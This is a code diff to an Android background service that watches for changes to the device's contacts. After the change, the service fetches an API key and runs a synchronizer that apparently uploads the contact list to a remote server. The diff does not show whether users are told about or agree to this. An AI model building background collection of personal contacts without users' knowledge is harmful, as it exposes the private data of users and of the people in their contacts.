@@ -8,6 +8,9 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 
+import com.theah64.xrob.asynctasks.ContactsSynchronizer;
+import com.theah64.xrob.utils.APIRequestGateway;
+
 public class ContactsWatcherService extends Service {
 
     private static final int MIN_THRESHOLD = 5000;
@@ -49,7 +52,18 @@ public class ContactsWatcherService extends Service {
 
                 System.out.println("Real code works here");
 
-                new ContactRefresher(getApplicationContext()).execute();
+                //Opening gate
+                new APIRequestGateway(ContactsWatcherService.this, new APIRequestGateway.APIRequestGatewayCallback() {
+                    @Override
+                    public void onReadyToRequest(String apiKey) {
+                        new ContactsSynchronizer(ContactsWatcherService.this, apiKey).execute();
+                    }
+
+                    @Override
+                    public void onFailed(String reason) {
+
+                    }
+                });
 
             } else {
                 System.out.println("Not now!");
